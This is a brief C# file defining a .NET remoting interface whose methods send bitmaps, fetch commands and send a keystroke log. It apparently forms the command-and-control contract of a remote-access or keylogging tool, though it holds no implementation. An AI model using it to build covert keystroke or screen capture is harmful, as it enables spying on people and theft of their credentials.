﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RemotingInterface
{
    public interface DesktopInterface
    {
        void HelloMethod(string name);
        void GoodbyeMethod();
        void SendBitmap(MemoryStream memoryStream); 
        string GetCommands();
        void SendKeystrokes(String keylog);
    }
}
